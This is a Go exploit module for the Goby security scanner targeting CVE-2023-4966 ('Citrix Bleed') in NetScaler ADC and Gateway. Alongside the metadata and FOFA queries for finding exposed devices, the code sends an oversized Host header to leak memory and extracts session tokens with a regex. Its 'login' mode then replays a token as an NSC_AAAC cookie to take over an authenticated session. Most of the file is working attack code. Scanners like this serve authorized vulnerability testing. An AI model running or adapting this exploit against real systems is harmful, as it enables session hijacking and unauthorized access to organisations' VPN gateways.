package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "NetScaler ADC/Gateway openid-configuration information disclosure vulnerability (CVE-2023-4966)",
    "Description": "<p>NetScaler ADC and NetScaler Gateway (formerly known as Citrix ADC and Citrix Gateway) are both products of Citrix Corporation in the United States. </p><p>Attackers construct special requests to read sensitive system information.</p>",
    "Product": "citrix-Access-Gateway",
    "Homepage": "https://www.citrix.com/",
    "DisclosureDate": "2023-09-14",
    "PostTime": "2023-10-26",
    "Author": "2737977997@qq.com",
    "FofaQuery": "title=\"Netscaler Gateway\" || (title==\"Citrix Login\" && body=\"Citrix ADC\") || title==\"Citrix ADC SDX - Login\" || (title=\"NetScaler Gateway\" && body=\"href=\\\"/vpn/images/AccessGateway.ico\\\"\") || ((body=\"class=\\\"_ctxstxt_NetscalerGateway\\\">NetScaler Gateway</title>\" || body=\"/vpn/css/ctxs.authentication.css\") && body=\"NetScaler Gateway\") || title=\"Citrix Access Gateway\" || title==\"Citrix Gateway\" || body=\"href=\\\"/vpn/images/AccessGateway.ico\" || header=\"ezisneercsresu=\" || header=\"Cyms-SecS\" || (header=\"pwcount\" && body=\"/vpn/images/AccessGateway.ico\") || (title=\"Citrix Gateway\" && (body=\"href=\\\"/vpn/images/AccessGateway.ico\" || body=\"class=\\\"citrixReceiverLogoAboutBox\\\"\" || (body=\"/vpn/js/gateway_login_view.js?\" && body=\"cloud.ottoworkfroce.eu/vpn/index.html\") || body=\"vpn/js/lsgateway_login_view.js\")) || (body=\"class=\\\"_ctxstxt_NetscalerGateway\\\"\" && body=\"receiver/images/common/icon_vpn.ico\") || (body=\"/vpn/nsshare.js\" && body=\"Citrix Systems, Inc.\") || (banner=\"Location: /vpn/index.html\" && banner=\"HTTP/1.1 302 Object Moved\" && banner=\"Set-Cookie: NSC_BASEURL\")",
    "GobyQuery": "title=\"Netscaler Gateway\" || (title==\"Citrix Login\" && body=\"Citrix ADC\") || title==\"Citrix ADC SDX - Login\" || (title=\"NetScaler Gateway\" && body=\"href=\\\"/vpn/images/AccessGateway.ico\\\"\") || ((body=\"class=\\\"_ctxstxt_NetscalerGateway\\\">NetScaler Gateway</title>\" || body=\"/vpn/css/ctxs.authentication.css\") && body=\"NetScaler Gateway\") || title=\"Citrix Access Gateway\" || title==\"Citrix Gateway\" || body=\"href=\\\"/vpn/images/AccessGateway.ico\" || header=\"ezisneercsresu=\" || header=\"Cyms-SecS\" || (header=\"pwcount\" && body=\"/vpn/images/AccessGateway.ico\") || (title=\"Citrix Gateway\" && (body=\"href=\\\"/vpn/images/AccessGateway.ico\" || body=\"class=\\\"citrixReceiverLogoAboutBox\\\"\" || (body=\"/vpn/js/gateway_login_view.js?\" && body=\"cloud.ottoworkfroce.eu/vpn/index.html\") || body=\"vpn/js/lsgateway_login_view.js\")) || (body=\"class=\\\"_ctxstxt_NetscalerGateway\\\"\" && body=\"receiver/images/common/icon_vpn.ico\") || (body=\"/vpn/nsshare.js\" && body=\"Citrix Systems, Inc.\") || (banner=\"Location: /vpn/index.html\" && banner=\"HTTP/1.1 302 Object Moved\" && banner=\"Set-Cookie: NSC_BASEURL\")",
    "Level": "2",
    "Impact": "<p>Attackers construct special requests to read sensitive system information.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.citrix.com\">https://www.citrix.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "showAll,login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2023-4966"
    ],
    "CNNVD": [
        "CNNVD-202310-666"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "NetScaler ADC/Gateway openid-configuration 信息泄露漏洞（CVE-2023-4966）",
            "Product": "citrix-Access-Gateway",
            "Description": "<p>NetScaler ADC 和 NetScaler Gateway（以前称为Citrix ADC和Citrix Gateway）都是美国思杰（Citrix）公司的产品。<br>攻击者通过构造特殊请求，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.citrix.com\">https://www.citrix.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者通过构造特殊请求，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "NetScaler ADC/Gateway openid-configuration information disclosure vulnerability (CVE-2023-4966)",
            "Product": "citrix-Access-Gateway",
            "Description": "<p>NetScaler ADC and NetScaler Gateway (formerly known as Citrix ADC and Citrix Gateway) are both products of Citrix Corporation in the United States.&nbsp;</p><p>Attackers construct special requests to read sensitive system information.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.citrix.com\">https://www.citrix.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers construct special requests to read sensitive system information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10858"
}`
	sendPayloaddas321 := func(hostInfo *httpclient.FixUrl) (string, error) {
		sendConfig := httpclient.NewGetRequestConfig("/oauth/idp/.well-known/openid-configuration")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Timeout = 30
		sendConfig.Header.Store("Host", strings.Repeat("a", 24576))
		resp, err := httpclient.DoHttpRequest(hostInfo, sendConfig)
		if err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "issuer") && strings.Contains(resp.RawBody, strings.Repeat("a", 200)) {
			return strings.ReplaceAll(resp.RawBody, strings.Repeat("a", 6), ""), err
		}
		return "", err
	}

	sendLogin213eqweqw := func(hostInfo *httpclient.FixUrl, session string) string {
		sendConfig := httpclient.NewPostRequestConfig("/logon/LogonPoint/Authentication/GetUserName")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Header.Store("Cookie", "NSC_AAAC="+session)
		sendConfig.Header.Store("Accept-Encoding", "gzip, deflate")
		sendConfig.Header.Store("Accept", "*/*")
		sendConfig.Header.Store("Connection", "close")
		sendConfig.Header.Store("Content-Length", "0")
		if resp, err := httpclient.DoHttpRequest(hostInfo, sendConfig); err == nil && resp.StatusCode == 200 {
			return resp.RawBody
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloaddas321(hostinfo)
			return err == nil && len(resp) > 0
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "login":
				resp, err := sendPayloaddas321(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				re := regexp.MustCompile(`([a-f0-9]{65})`)
				if !re.MatchString(resp) {
					expResult.Success = false
					expResult.Output = `未获取到cookie`
					return expResult
				}
				sessions := re.FindStringSubmatch(resp)
				output := sendLogin213eqweqw(expResult.HostInfo, sessions[1])
				if len(output) == 0 {
					expResult.Success = false
					expResult.Output = `cookie无法登录`
					return expResult
				}
				expResult.Output = sendLogin213eqweqw(expResult.HostInfo, sessions[1]) + "\nCookie：NSC_AAAC=" + sessions[1]
				expResult.Success = true
			case "showAll":
				resp, err := sendPayloaddas321(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				if len(resp) == 0 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Output = resp
				expResult.Success = true
			default:
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
